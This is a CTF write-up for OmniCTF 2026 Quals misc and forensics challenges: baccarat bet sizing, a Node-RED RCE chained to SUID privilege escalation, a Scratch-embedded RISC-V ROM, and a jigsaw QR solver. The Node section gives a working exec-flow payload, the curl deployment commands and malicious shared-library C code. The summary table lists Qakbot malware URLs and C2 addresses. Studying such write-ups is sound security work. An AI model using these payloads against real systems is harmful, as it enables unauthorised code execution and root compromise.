---
title: "OmniCTF 2026 Quals Misc + Forensics Writeup: 5 Solved"
slug: "omnictf-2026-quals-misc-forensics-writeup"
description: "OmniCTF 2026 Quals misc + forensics: baccarat Kelly-x2; Node-RED unauth RCE + DT_RUNPATH SUID privesc; Scratch RISC-V ROM; jigsaw CP-SAT; Qakbot obama264 PCAP."
date: 2026-07-20T00:30:00Z
lastmod: 2026-08-04T10:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
aliases:
  - /ctf-writeups/omnictf-2026-quals-misc-writeup/
series: ["OmniCTF 2026 Quals"]
tags:
  - "omnictf"
  - "omnictf 2026"
  - "omnictf quals"
  - "ctf writeup"
  - "misc"
  - "forensics"
  - "kelly criterion"
  - "baccarat betting"
  - "node-red unauth rce"
  - "exec node flow"
  - "dt_runpath privesc"
  - "suid shared library hijack"
  - "musl ld.so runpath"
  - "scratch sb3 zip"
  - "risc-v linux rom"
  - "newc cpio initramfs"
  - "jigsaw puzzle solver"
  - "cp-sat assignment"
  - "qr code repair"
  - "pcap forensics"
  - "qakbot obama264"
  - "ja3 ja4 tls fingerprint"
  - "malware-traffic-analysis.net"
  - "phishing eml analysis"
keywords:
  - "omnictf 2026 quals misc writeup"
  - "omnictf 2026 quals forensics writeup"
  - "omnictf baccarat writeup"
  - "omnictf node writeup"
  - "omnictf nostalgia writeup"
  - "omnictf sanity p0zzl3 writeup"
  - "omnictf quackquackdiridiriduck writeup"
  - "kelly criterion 2x bet sizing baccarat"
  - "node-red 5.0.1 exec node rce"
  - "dt_runpath world-writable directory suid hijack"
  - "libshared.so constructor uid 0"
  - "scratch project riscv linux kernel"
  - "cpio newc 070701 magic parse"
  - "jigsaw alpha channel edge classification"
  - "cp-sat 10x10 puzzle assignment"
  - "purple qr code morphological repair"
  - "qakbot obama264 pcap analysis"
  - "ja3 43016d7f7f9336b17c884650d0d2545d no-sni"
  - "malware-traffic-analysis brad duncan iocs"
  - "tshark http export-objects pcap"
  - "ctf step by step 2026"
toc: true
cover:
  image: "/images/articles/omnictf-2026-quals-misc-forensics-writeup.png"
  alt: "OmniCTF 2026 Quals misc + forensics writeup — five challenges solved covering baccarat Kelly-x2 bet sizing against the deliberately weak BlackShard agent, Node Node-RED unauth RCE chained to a SUID DT_RUNPATH shared-library hijack for root, nostalgia Scratch .sb3 archive embedding a bootable RISC-V Linux kernel with newc cpio initramfs, Sanity P0zzl3 100-piece jigsaw CP-SAT with morphological QR repair, and QuackQuackDiriDiriDuck the Brad Duncan 2023-05-24 obama264 Qakbot infection PCAP with 10 sub-question flags recovered via tshark HTTP object export, no-SNI JA3 43016d7f7f9336b17c884650d0d2545d clustering to the four TLS C2 endpoints, and UTC timestamp reconciliation against the malware-traffic-analysis.net ground-truth notes"
---

Here at **CyberSecurity Elite**, we tackled OmniCTF 2026 Quals' misc track that runs the full skill spectrum, plus a rich forensics challenge that pairs naturally with it: **baccarat** (game theory / Kelly criterion + reconnect loop), **Node** (Node-RED unauth RCE chained to a SUID `DT_RUNPATH` shared-library hijack for root), **nostalgia** (nested container parsing from Scratch `.sb3` to a RISC-V Linux kernel to a `newc` cpio to a text file), **Sanity P0zzl3** (computer vision + constraint programming: 100 transparent PNG jigsaw pieces of a shuffled QR code solved as a 10x10 assignment problem, then morphological repair to decode), and **QuackQuackDiriDiriDuck** (forensics: a 2023-05-24 Qakbot/OBAMA264 infection PCAP with 10 sub-question flags reconstructed from `tshark` HTTP object export, JA3/JA4 no-SNI fingerprints identifying the four TLS C2 endpoints, and UTC timestamp reconciliation against Brad Duncan's malware-traffic-analysis.net ground-truth notes). What ties them together is a single discipline: **the handout is the oracle**. baccarat's `game.py` simulates its own agents. Node's `/entrypoint.sh` names the misconfiguration. nostalgia's `.sb3` is a ZIP. Sanity P0zzl3's PNG alpha channels give piece geometry cleanly. QuackQuackDiriDiriDuck's PCAP filename literally names the malware-traffic-analysis.net corpus entry to cross-reference. Every challenge hands you enough to reconstruct the exploit from first principles.

Handouts, per-challenge READMEs, and solver scripts live at [Abdelkad3r/OmniCTF-2026-Quals](https://github.com/Abdelkad3r/OmniCTF-2026-Quals). Adjacent writeups on the same event: the [OmniCTF 2026 Quals web writeup](/ctf-writeups/omnictf-2026-quals-web-writeup/), [OmniCTF 2026 Quals pwn writeup](/ctf-writeups/omnictf-2026-quals-pwn-writeup/), [OmniCTF 2026 Quals reverse writeup](/ctf-writeups/omnictf-2026-quals-reverse-writeup/), [OmniCTF 2026 Quals crypto writeup](/ctf-writeups/omnictf-2026-quals-crypto-writeup/), and [OmniCTF 2026 Quals game writeup](/ctf-writeups/omnictf-2026-quals-game-writeup/).

## The five OmniCTF 2026 Quals misc + forensics challenges

| Challenge | Difficulty | Bug class / primitive | Flag |
|---|---|---|---|
| baccarat | Easy-medium (110 solves) | Live TCP even-money bet loop. 12-entry table roster of `(player_agent, banker_agent)` pairs; **BlackShard** is the deliberately weak agent (docstrings say it refuses good draws). Simulate each roster entry with handout's own `game.py` for 50k rounds each; BlackShard-adjacent tables give 5.3-6.7% edge for the other side, VoltaicAI-vs-non-BlackShard gives 2.2-2.6%. Bet the favoured side, size = **2x Kelly** clamped to `[1, min(bankroll, target - bankroll)]`. Full-Kelly is too slow for the 180 s timeout; over-betting trades log growth for reach (~13% success per session). Wrap the client in a reconnect loop. | `omni{baccarat_kelly_goes_brrrr_6da7b1f}` |
| Node | Medium (85 solves) | Two-stage chain. **Stage 1**: Node-RED 5.0.1 with no `adminAuth`; `POST /flows` accepts an `http in → exec (useSpawn:false) → change → http response` flow, giving instant RCE as `svc_node` via `POST /api/x`. **Stage 2**: `/usr/local/bin/nodestatus` is SUID root, ELF has `DT_NEEDED: libshared.so` + `DT_RUNPATH: /var/lib/node`. `/entrypoint.sh` does `chmod 0777 /var/lib/node` before dropping privileges, and musl `ld.so` honours `DT_RUNPATH` for setuid binaries. Compile a malicious `libshared.so` with the container's own `gcc` + musl-dev; `__attribute__((constructor))` calls `setuid(0); system(...)` before `main()`; trigger `nodestatus` and read `/root/flag.txt`. | `OmniCTF{N0d3_3v3rywh3r3_1d974eea307327134462512614582680}` |
| nostalgia | Easy (105 solves) | Handout is a Scratch 3 `.sb3` project (which is a ZIP). `project.json` has a `RISCV.ROM` Scratch list with 4,263,001 decimal-string byte entries: a bootable RISC-V Linux 6.1.14 kernel (`riscv-minimal-nommu`, BusyBox 1.36.0). `strings` on the reconstructed ROM shows a `newc` cpio initramfs (magic `070701`). Parse the cpio (110-byte ASCII-hex header, 13 fields, 4-byte-aligned name + data), extract `root/readme.txt`, which contains `console.log("OmniCTF{...}");`. | `OmniCTF{ig_bro_have_some_n0stalgiaaa-676767676789}` |
| Sanity P0zzl3 | Sanity (59 solves) | 100 transparent PNG jigsaw pieces of a shuffled purple QR code. Direct barcode scan fails: the grey jigsaw outlines and seam gaps cut thin white notches through the QR modules. Solve as a 10x10 assignment problem. Recover per-piece boundary curves from the alpha channel (`L[y]`, `R[y]`, `T[x]`, `B[x]`), classify each side as flat/tab/hole from the central-half deviation from the shoulder line, score neighbour pair compatibility from normalised boundary curve match, CP-SAT `AllDifferent` + border-flat constraints + tab/hole compatibility, minimise total seam cost. After rendering the assembled board, threshold purple pixels, morphological dilate + close to bridge seam cuts, then `QRCodeDetector.detectAndDecode()`. | `omniCTF{I_h0p3_y0u_found_th1s_fun_5a3bba1fec}` |
| QuackQuackDiriDiriDuck | Forensics (161 pts) | Handout is `2023-05-24-obama264-Qakbot-infection.pcap` (18 MB) plus 5 phishing `.eml` samples + a red-herring `NoPDFEmail.eml`. Filename maps directly to Brad Duncan's malware-traffic-analysis.net corpus entry for that day (password `infected_20230524`). Ten sub-question flags on rCTF. Solve chain: `7z x -pinfected` (macOS `unzip` can't do WinZip AES), `tshark ... --export-objects "http,pcap_objects"` extracts the initial ZIP (containing `Claim_A615.wsf` padded with Kant's *Critique of Pure Reason* as anti-analysis filler) and the Qakbot DLL `aKUVYL8o0uv.dat` (PE32, MD5 `775988673806d9522b889aa2a09cc05b`), cluster no-SNI JA3 `43016d7f7f9336b17c884650d0d2545d` for the four TLS C2 endpoints, convert timestamps to UTC (grader defaults to UTC, not local), match Brad's uppercase `QAKBOT` / `OBAMA264` conventions verbatim. **9 of 10 sub-flags recovered** (Q2 "sender addresses alphabetically" unresolved due to `.example` sanitisation ambiguity). | Sub-flags include `OmniCTF{5}`, `OmniCTF{http://adubuildersco.com/ewukhyqpjz/ewukhyqpjz.zip}`, `OmniCTF{4}`, `OmniCTF{142.118.221.248:2222+185.81.114.188:443+188.28.19.84:443+201.130.154.90:443}`, `OmniCTF{2023-05-24 16:34:13}`, `OmniCTF{2023-05-24 16:35:27}`, `OmniCTF{340.388}`, `OmniCTF{QAKBOT}`, `OmniCTF{OBAMA264}` |

The five challenges share a discipline worth stating up front: **the handout is the oracle**. In every case the challenge author ships enough infrastructure that you don't need to guess anything. baccarat ships the game logic and the agents, so simulating the exact win probabilities is a five-line loop. Node ships the entrypoint script and the SUID binary, so the misconfiguration is grep-visible. nostalgia ships the entire RISC-V Linux ROM as a Scratch list, so the exploit is "know that `.sb3` is a ZIP and `070701` is a cpio magic." Sanity P0zzl3 ships transparent alpha channels on every piece, so boundary geometry is exact rather than inferred. QuackQuackDiriDiriDuck's PCAP filename literally names the malware-traffic-analysis.net corpus entry to cross-reference for ground-truth IoCs. When the handout is this thorough, the trained-triage move is to import it, dump it, or parse it before touching any theory.

## Methodology — import the handout, don't rewrite it

A pattern that worked on every challenge in this set: **use the challenge author's own code and data structures as your primary tools**. baccarat's `import game` + `import agents` gives you the exact matchup edges to 0.1% accuracy in under a minute, so no need to derive baccarat probability theory. Node's shell-visible `/entrypoint.sh` and `readelf -d`-visible `DT_RUNPATH` are the entire attack surface; you never need to reverse-engineer the C code of `nodestatus` because the shell script and the ELF metadata already tell you where the trust boundary breaks. nostalgia's `project.json` reveals the RISC-V ROM in the first `zipfile.ZipFile` call; parsing it as bytes and running `strings` on the result surfaces both the Linux banner and the cpio magic without ever booting the ROM in an emulator. Sanity P0zzl3's alpha channel eliminates any need for corner-detection heuristics or CNN-based edge classifiers; the boundary is the alpha edge, exactly. QuackQuackDiriDiriDuck's PCAP filename (`2023-05-24-obama264-Qakbot-infection.pcap`) is a direct index into Brad Duncan's malware-traffic-analysis.net corpus, whose published notes package (password `infected_20230524`) is the ground-truth IoC list; every sub-question flag can be cross-checked against Brad's timestamps, IP list, and JA3 fingerprints before submitting.

The correlate is: **don't overengineer the "easier" challenges**. nostalgia is not asking you to run the RISC-V kernel; it's asking you to recognise that the ROM is a container and to know how to parse its layers. baccarat is not asking you to write a baccarat solver; it's asking you to notice that the handout already contains one. QuackQuackDiriDiriDuck is not asking you to reverse-engineer a Qakbot sample; it's asking you to run `tshark`, cluster no-SNI TLS ClientHellos by JA3, and match Brad's published IoCs. When you find yourself building infrastructure that the challenge doesn't strictly need, you've probably missed the intended shortcut.

Per-challenge walkthroughs follow.

## 1. baccarat

Live TCP betting game with a 12-entry roster of agent-vs-agent matchups. BlackShard is the deliberately weak agent, so every BlackShard-adjacent table has a 5.3-6.7% edge for the other side. Kelly-x2 sizing plus reconnect loop.

### Step 1 — Read the server and the agents

`server.py` names the constants:

```python
START_BANKROLL   = 1000
TARGET_BANKROLL  = 100_000
ROUNDS_PER_TABLE = 12

TABLE_ROSTER = [
    ("omnicybr",   "blackshard", 12),
    ("blackshard", "omnicybr",   12),
    ("northstar",  "blackshard", 11),
    ("blackshard", "northstar",  11),
    ("nipcat",     "blackshard",  9),
    ("blackshard", "nipcat",      9),
    ("voltaicai",  "blackshard",  8),
    ("blackshard", "voltaicai",   8),
    ("omnicybr",   "voltaicai",   6),
    ("voltaicai",  "omnicybr",    6),
    ("northstar",  "voltaicai",   5),
    ("voltaicai",  "northstar",   5),
]
```

Ties are replayed internally via `play_until_resolved`, so this is pure even-money. No banker commission. `game.py` fixes eight decks with the standard "natural on 8/9" short-circuit and lets each agent choose `DRAW` / `STAND` from private state only.

The five branded AIs are pure `choose_action(state, rng)` functions whose docstrings telegraph the tiers:

| module | Role | Strength |
|---|---|---|
| omnicybr | ideal (draw ≤5, stand ≥6) | strong |
| northstar | near-ideal with small leaks | strong |
| nipcat | noisy threshold model | medium |
| **blackshard** | **timid, refuses good draws** | **weak** |
| voltaicai | over-draws far past 6 | weak |

The moment you read "timid" on BlackShard, you know: bet against BlackShard.

### Step 2 — Simulate the exact edges

You don't need to reinvent baccarat theory. The handout is the oracle:

```python
import random
from game import Shoe, play_until_resolved, load_player_agents, load_banker_agents

players = {a.module_name: a for a in load_player_agents()}
bankers = {a.module_name: a for a in load_banker_agents()}

for pname, bname in ROSTER:
    p_agent, b_agent = players[pname], bankers[bname]
    shoe = Shoe(random.Random(0))
    p_rng, b_rng = random.Random(1), random.Random(2)
    wins = {"player": 0, "banker": 0}
    for _ in range(50_000):
        outcome, _ = play_until_resolved(p_agent, b_agent, shoe, p_rng, b_rng)
        wins[outcome.winner] += 1
    p_rate = wins["player"] / sum(wins.values())
    print(f"P={pname:10s} B={bname:10s}  p_win={p_rate*100:5.2f}%")
```

Two clean tiers emerge:

```
P=omnicybr   B=blackshard  p_win=56.62%  edge=6.62% (PLAYER favored)
P=blackshard B=omnicybr    p_win=43.28%  edge=6.72% (BANKER favored)
P=northstar  B=blackshard  p_win=56.42%  edge=6.42% (PLAYER favored)
P=blackshard B=northstar   p_win=43.39%  edge=6.61% (BANKER favored)
P=nipcat     B=blackshard  p_win=55.80%  edge=5.80% (PLAYER favored)
P=blackshard B=nipcat      p_win=44.36%  edge=5.64% (BANKER favored)
P=voltaicai  B=blackshard  p_win=53.88%  edge=3.88% (PLAYER favored)
P=blackshard B=voltaicai   p_win=46.89%  edge=3.11% (BANKER favored)
P=omnicybr   B=voltaicai   p_win=52.22%  edge=2.22% (PLAYER favored)
P=voltaicai  B=omnicybr    p_win=47.36%  edge=2.64% (BANKER favored)
P=northstar  B=voltaicai   p_win=52.28%  edge=2.28% (PLAYER favored)
P=voltaicai  B=northstar   p_win=47.84%  edge=2.16% (BANKER favored)
```

### Step 3 — Size with Kelly x 2

For an even-money game with win probability `p` and edge `e = p - 0.5`, Kelly is `f* = 2e` and expected log growth per bet is `~2e^2`. Concrete numbers give a weighted-average log growth of about `4.9e-3` nats per bet. Reaching 100x target requires `ln(100) ≈ 4.605` nats, i.e. ~940 bets at full Kelly. Too slow for the 180-second client timeout.

Monte-Carlo over 10,000 sessions per strategy, sampling the roster with the server's weights:

| Strategy | P(reach 100k) | Avg rounds when won |
|---|---:|---:|
| Kelly x1 | 1.7% | 171 |
| **Kelly x2** | **12.9%** | **134** |
| Kelly x3 | 12.7% | 103 |
| Kelly x5 | 5.7% | 44 |
| Fixed 25% bankroll | 12.5% | 123 |
| Fixed 50% bankroll | 6.2% | 53 |

Kelly x2 sits on a flat plateau (Kelly x2 to Kelly x3 are all around 12-13%). Bet formula:

```python
def bet_size(bankroll, edge, target=TARGET_BANKROLL, kelly_mult=2.0):
    raw = int(2 * kelly_mult * edge * bankroll)
    return max(1, min(raw, bankroll, target - bankroll))
```

The `min(..., target - bankroll)` clamp turns the last few rounds into a mini-bold-play problem: you can't overshoot 100,000, and once close you bet exactly what's needed.

### Step 4 — Fire with a reconnect loop

The transcript is line-oriented ASCII, so the client is trivial `readline`/`write`. Wrap in a reconnect loop:

```python
for attempt in range(200):
    ok, flag = play_session(host, port, use_ssl=True)
    if ok:
        break
```

~13% success per session means five attempts get you to 50%, twenty attempts get above 95%. Live run:

```
$ python3 solve.py --host baccarat-<id>.inst.omnictf.com --port 1337 --ssl
[*] Attempt 1...
[+] target reached in 204 rounds -- omni{baccarat_kelly_goes_brrrr_6da7b1f}
```

Per-challenge README + solver: [misc/baccarat](https://github.com/Abdelkad3r/OmniCTF-2026-Quals/tree/main/misc/baccarat).

Three portable lessons. **The handout is the oracle**: when the server ships its own game logic and agents, importing them into your simulator beats any theoretical analysis. **Kelly is not a suggestion, it's a scaling law**: full Kelly maximises log growth, but log-growth alone might not fit inside the timeout. Over-Kelly trades geometric growth for reach; the plateau of viable multipliers is broad (~1.5x to ~3.5x on this instance). **The flag literally spells the technique**: `kelly_goes_brrrr` is the author's confirmation that the intended path is Kelly bet sizing on the identified edge.

## 2. Node

Node-RED 5.0.1 with no admin auth is a shell. Chain it to a SUID binary whose `DT_RUNPATH` points at a `chmod 0777` directory, drop a malicious `libshared.so`, and the constructor runs as uid 0.

### Step 1 — Reach the editor

```
$ curl -sk https://node-<id>.inst.omnictf.com/settings | jq '.version,.functionExternalModules'
"5.0.1"
true
$ curl -sk https://node-<id>.inst.omnictf.com/auth/login
{}
$ curl -sk https://node-<id>.inst.omnictf.com/flows
[]
```

`/settings` responds without a session, `/auth/login` returns `{}`, `/flows` returns `[]`. The admin API is fully open. Get in, done.

### Step 2 — Ship an RCE flow

The intended primitive is the exec node wired behind an http in node, so a plain `curl` gives you output back. The gotcha is the `useSpawn` toggle:

- `useSpawn: true` tokenises `command + msg.payload` on whitespace and calls `spawn(cmd, args)`. Payload `ls -la /` becomes `spawn("/bin/sh", ["-c", "ls", "-la", "/"])`, and sh reads only the first word after `-c` as the script, so you get `ls` with no arguments. Very confusing during recon.
- `useSpawn: false` uses `child_process.exec(cmd + " " + payload)`, which already wraps its argument in `/bin/sh -c "..."`. Setting `command: ""` and `addpay: "payload"` gives you "whatever I POST is a shell command."

Final flow:

```json
[
  {"id":"tab1","type":"tab","label":"pwn"},
  {"id":"h1","type":"http in","z":"tab1","url":"/x","method":"post","wires":[["e1"]]},
  {"id":"e1","type":"exec","z":"tab1","command":"","addpay":"payload","append":"",
   "useSpawn":"false","timer":"60","wires":[["c1"],["c1"],[]]},
  {"id":"c1","type":"change","z":"tab1",
   "rules":[{"t":"set","p":"headers.content-type","pt":"msg","to":"text/plain","tot":"str"}],
   "wires":[["r1"]]},
  {"id":"r1","type":"http response","z":"tab1","statusCode":"200","headers":{}}
]
```

Deploy once, then use forever:

```
$ curl -sk -X POST https://.../flows \
    -H 'Content-Type: application/json' \
    -H 'Node-RED-Deployment-Type: full' \
    --data-binary @flow.json
$ curl -sk -X POST https://.../api/x \
    -H 'Content-Type: text/plain' --data-binary 'id'
uid=1000(svc_node) gid=1000(svc_node) groups=1000(svc_node)
```

RCE, as `svc_node`. Note: redeploys of flows with unresolvable `require()`s crash the Node-RED runtime and take the instance 502. **Deploy once; run everything else through it.**

### Step 3 — Recon the SUID surface

```
$ curl ... 'cat /entrypoint.sh'
#!/bin/sh
set -e
chmod 0777 /var/lib/node
exec su -s /bin/sh svc_node -c "node-red"

$ curl ... 'find / -perm -4000 -type f 2>/dev/null'
/usr/bin/passwd
/usr/bin/expiry
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chage
/usr/bin/chfn
/usr/local/bin/nodestatus            # <-- non-distro, custom

$ curl ... 'ls -la /var/lib/node/ /usr/local/bin/nodestatus'
drwxrwxrwx  1 root  root  4096  /var/lib/node
-rwxr-xr-x  1 root  root 16712  /var/lib/node/libshared.so
-rwsr-xr-x  1 root  root 18752  /usr/local/bin/nodestatus
```

The `chmod 0777 /var/lib/node` is deliberate; the entrypoint script leaves the directory world-writable right before dropping privileges. Combined with the SUID `nodestatus` and its `DT_RUNPATH`, this is the intended vuln shape.

Parse the ELF dyn tags:

```
DT_NEEDED:  libshared.so
DT_NEEDED:  libc.musl-x86_64.so.1
DT_RUNPATH: /var/lib/node          # <-- world-writable
```

`nodestatus` imports two symbols (`print_banner`, `log_status`) from `libshared.so`. musl `ld.so` honours `DT_RUNPATH` for setuid binaries (unlike `LD_LIBRARY_PATH`, which is scrubbed). So dropping our own `libshared.so` at `/var/lib/node/libshared.so` gives us code execution as uid 0 for the lifetime of `nodestatus`.

### Step 4 — Weaponise `libshared.so`

Provide both imported symbols as no-op stubs so the loader resolves them and `nodestatus` runs normally. Do the real work in a constructor that fires before `main()`:

```c
#include <stdlib.h>
#include <unistd.h>

static void run(void) __attribute__((constructor));
static void run(void) {
    setuid(0); setgid(0);
    system("cat /root/flag* /flag* 2>/dev/null > /tmp/pwn_out.txt; "
           "chmod 644 /tmp/pwn_out.txt");
}

void print_banner(void) { }
void log_status(const char *a, const char *b, const char *c) {
    (void)a; (void)b; (void)c;
}
```

Container has `gcc-15.2.0` + musl headers, so compile in-place (no ABI worries):

```
$ curl ... 'cat > /tmp/evil.c <<"EOF"
[...evil.c contents...]
EOF
gcc -shared -fPIC -o /var/lib/node/libshared.so /tmp/evil.c && echo OK'
OK
```

### Step 5 — Trigger and read

```
$ curl ... '/usr/local/bin/nodestatus 2>&1'
  +-----------------------------------------+
  |  SysWatch :: Node-RED Status Checker    |
  |  v1.0.0 - Internal Monitoring Tool      |
  +-----------------------------------------+
  Port   : 127.0.0.1:1880
  Status : UP

$ curl ... 'cat /tmp/pwn_out.txt'
uid=0(root) gid=0(root) groups=1000(svc_node)
===
-r--------  1 root  root  58 /root/flag.txt
OmniCTF{N0d3_3v3rywh3r3_1d974eea307327134462512614582680}
```

Per-challenge README + solver: [misc/node](https://github.com/Abdelkad3r/OmniCTF-2026-Quals/tree/main/misc/node).

Three portable lessons. **Node-RED without `adminAuth` is a shell.** The moment the admin API is reachable, exec nodes give arbitrary command execution and function nodes give arbitrary JavaScript. v5.0.1 defaults ship `functionExternalModules: true`, so a function node can `require()` arbitrary npm packages. Any Node-RED behind an Internet-reachable path must set `adminAuth`. **`DT_RUNPATH` on setuid binaries is honoured by both glibc and musl.** Only `LD_LIBRARY_PATH` and friends are scrubbed at setuid dispatch. If the runpath is a world-writable directory, the setuid bit is effectively delegated to whoever can write there. Never combine "world-writable path" with "setuid trust anchor," even indirectly through a shared library. **Compiler in the container closes the loop.** `gcc + musl-dev` on the target means the `.so` ABI is guaranteed to match: no cross-compilation, no GLIBC-vs-musl symbol-version surprises. Production containers should not ship a compiler.

## 3. nostalgia

Scratch 3 `.sb3` is a ZIP. Inside is a full RISC-V Linux boot image as a Scratch list. Parse the embedded cpio and read a file.

### Step 1 — Recognise `.sb3` as a container

```
$ unzip -l nostalgia.sb3
...
project.json
19adfcc5dc405c3e48bc3443d6a85412.png
2cad5629a7f5460b9df1aae292b686bb.svg
[...]
```

Standard Scratch 3 layout: `project.json` plus media assets. The media are tiny costume files; the real data lives in `project.json`.

### Step 2 — Enumerate Scratch state

Scratch stores lists in `project.json`. One helper prints all lists with their sizes:

```python
import json, zipfile

with zipfile.ZipFile("nostalgia.sb3") as z:
    project = json.loads(z.read("project.json"))

for target in project["targets"]:
    for _id, (name, values) in target.get("lists", {}).items():
        print(target["name"], name, len(values))
```

Output:

```
Stage    RISCV.ROM       4263001
Stage    RISCV.DTB       1536
RISCV    RAM             4263001
Terminal buffer.glyphs   5074
```

Very strong signal. This is not a normal Scratch game with hidden sprites; it's a saved RISC-V virtual machine. `RISCV.ROM` is the boot image.

### Step 3 — Reconstruct the ROM

The list is decimal byte strings:

```python
rom = bytes(int(value) & 0xFF for value in values if str(value).strip())
```

`strings` on the reconstructed ROM confirms it's a bootable Linux image:

```
Linux version 6.1.14mini-rv32ima
BusyBox v1.36.0
console::respawn:/bin/login -f ctf
riscv-minimal-nommu
```

And critically:

```
070701...
bin/busybox
etc/passwd
root/fizzbuzz.js
root/readme.txt
```

`070701` is the magic for the ASCII `newc` cpio format used by Linux initramfs images.

### Step 4 — Parse the `newc` cpio

`newc` header layout: 6-byte magic + 13 × 8-byte ASCII-hex fields + `namesize` bytes of name (NUL-terminated, then 4-byte-aligned) + `filesize` bytes of data (then 4-byte-aligned).

Relevant fields:

| Field index | Meaning |
|---|---|
| 6 | `filesize` |
| 11 | `namesize` |

Parser:

```python
def parse_newc_archive(blob, start):
    pos = start
    while pos + 110 <= len(blob):
        header = blob[pos:pos + 110]
        fields = [int(header[6 + i * 8:14 + i * 8], 16) for i in range(13)]
        file_size = fields[6]
        name_size = fields[11]

        name_start = pos + 110
        name_end   = name_start + name_size
        name       = blob[name_start:name_end - 1].decode("utf-8", "replace")

        data_start = (name_end + 3) & ~3
        data_end   = data_start + file_size
        yield name, blob[data_start:data_end]

        pos = (data_end + 3) & ~3
        if name == "TRAILER!!!":
            return
```

### Step 5 — Read the target file

`root/fizzbuzz.js` is nostalgia bait (a fizzbuzz for-loop). `root/readme.txt` has the flag:

```js
console.log("OmniCTF{ig_bro_have_some_n0stalgiaaa-676767676789}");
```

Per-challenge README + solver: [misc/nostalgia](https://github.com/Abdelkad3r/OmniCTF-2026-Quals/tree/main/misc/nostalgia).

Two portable lessons. **`.sb3` (and `.docx`, `.xlsx`, `.pptx`, `.rbxl`, `.krita`, `.blend`, `.psd`) are all zips**. `unzip -l` first, always. **Byte-array Scratch lists that are huge are usually a covert file channel**. 4.2 MB of decimal bytes in a "media project" is telegraphing that the interesting data is the reconstructed binary. Same class as PNG `zTXt` chunks, DOCX `customXml/`, MIDI pitch-wheel events, and every other "put your data in the container's extensibility slot" technique.

## 4. Sanity P0zzl3

100 transparent PNG jigsaw pieces of a shuffled purple QR code. Solve as 10x10 CP-SAT assignment on alpha-channel geometry. Then repair the QR modules and decode.

### Step 1 — Triage the archive

```
$ unzip -l pieces.zip | head
pieces/01b2.png
pieces/034e.png
[...]
$ ls pieces/*.png | wc -l
100
```

100 pieces with random-hex filenames. Every PNG has an alpha channel; visible content is white puzzle material + grey outlines + purple QR modules. No useful EXIF, no filename coordinates, no CRC ordering trick. The intended path is to solve the actual puzzle.

### Step 2 — Recover piece geometry from alpha

For each piece, treat alpha as ground truth shape. Four boundary profiles:

- `L[y]`: first non-transparent x on row `y`
- `R[y]`: last non-transparent x on row `y`
- `T[x]`: first non-transparent y on column `x`
- `B[x]`: last non-transparent y on column `x`

Pieces are individually trimmed, so their local image coords aren't the puzzle coords. But every side has two straight "shoulders" flanking the tab/hole; the median of the shoulder regions gives the original grid line for that side:

```python
def shoulder(profile):
    n = len(profile)
    values = []
    for start, end in ((0.12, 0.28), (0.72, 0.88)):
        segment = profile[int(n * start):int(n * end)]
        values.extend(segment[~np.isnan(segment)])
    return float(np.median(values))
```

The internal cell is ~250 pixels; the whole puzzle is 2500x2500 before padding.

### Step 3 — Classify flats, tabs, and holes

Central half of each side classifies it:

- Boundary almost constant → **flat** (outside edge)
- Boundary moves outward from the shoulder line → **tab**
- Boundary moves inward from the shoulder line → **hole**

Exact labels don't matter, only that internal sides must be tab-vs-hole compatible and border sides must be flat.

Balanced counts (good sanity check):

```
L: 46 tabs, 44 holes, 10 flats
R: 46 holes, 44 tabs, 10 flats
T: 52 holes, 38 tabs, 10 flats
B: 52 tabs, 38 holes, 10 flats
```

The four corners are unique (two flat sides each): `9098.png`, `9878.png`, `5755.png`, `bfd3.png`.

### Step 4 — Score neighbours

Shape compatibility alone isn't enough; many tabs and holes look similar. Score every possible neighbour pair by comparing the two normalised boundary curves. For a horizontal seam, the right edge of piece A and the left edge of piece B should be the same curve once both are placed on the 250-pixel grid. Build fixed-length edge signatures, allow small vertical/horizontal shift, score by robust curve match.

### Step 5 — CP-SAT assignment

100 variables (one per board cell), constraints:

- `AllDifferent`: each piece used once.
- Border cells: only pieces with the correct flat side.
- Internal seams: only tab/hole compatible pairs.
- Minimise: sum of horizontal and vertical seam costs.

OR-Tools solves this directly. On the reference machine:

```
[*] CP-SAT status: OPTIMAL, objective: 2443490
```

~2.5 minutes to optimal. Solved grid (10x10):

```
9098 a8d8 37d0 bcc2 b30f 3890 471a 09d6 e017 9878
d233 e400 521f 2de9 a2c8 9ff6 1550 9df0 515b 7c14
b027 c382 9607 f6d0 f5cd 7627 07ed a310 3990 ee93
abfa cbc5 d5df ecb7 3038 c5dd 4eef c9a0 5983 034e
9d6b 9cda 739d dd28 defe 1a1a 919c c407 52cc 988c
d7be f1d6 3769 82b8 0949 17b6 1933 cd27 a7a5 572e
c8e7 f1a8 107a d186 de9f ca4f edb2 a590 de19 54f8
5fd9 f273 7055 6bca c028 4b5b 5a9d 3f60 fbea 92b5
ed61 9637 ecdd 0ebb 4cee 266a 80a4 823e 01b2 143c
bfd3 6e1a 50a7 bb5d cc84 bb7a 344d 12ba 3c91 5755
```

### Step 6 — Repair and decode the QR

Rendering the grid makes the QR visible but direct decode fails: grey puzzle outlines + seam gaps punch thin white cuts through the purple modules. `QRCodeDetector` locates the board outline but can't decode the payload. Rebuild a clean B/W QR image:

1. Crop the assembled 10x10 board.
2. Threshold only purple pixels (ignore white fill and grey outlines).
3. Dilate by ~4 pixels.
4. Morphological close with a `17x17` kernel to bridge seam cuts.
5. Invert to black-on-white + quiet zone.
6. `QRCodeDetector().detectAndDecode()`.

```python
purple = (
    (crop[:, :, 0] < 170) &
    (crop[:, :, 2] > 110) &
    (crop[:, :, 1] < 120)
).astype(np.uint8) * 255

repaired = cv2.dilate(purple, np.ones((4, 4), np.uint8), iterations=1)
repaired = cv2.morphologyEx(repaired, cv2.MORPH_CLOSE,
                             np.ones((17, 17), np.uint8))
```

Repaired QR decodes to: `omniCTF{I_h0p3_y0u_found_th1s_fun_5a3bba1fec}`.

Per-challenge README + solver: [misc/sanity_p0zzl3](https://github.com/Abdelkad3r/OmniCTF-2026-Quals/tree/main/misc/sanity_p0zzl3).

Three portable lessons. **PNG alpha channels give exact geometry.** No corner detection, no CNN, no edge Hough transform needed. If a challenge ships transparent pieces, alpha is the ground truth. **CP-SAT is the right tool for constrained assignment problems**. 100-variable jigsaws are past hand-solving, past greedy heuristics, and inside OR-Tools' reach. `AllDifferent` + per-cell constraints + weighted objective + a few minutes of solver time. **Morphological repair beats a stronger decoder** when the QR modules are cut by seam gaps. Standard `dilate + close` with correctly-sized kernels (dilate ~4px for module thickening, close 17x17 for the seam gap width) restores the modules to a clean B/W image any QR library will decode.

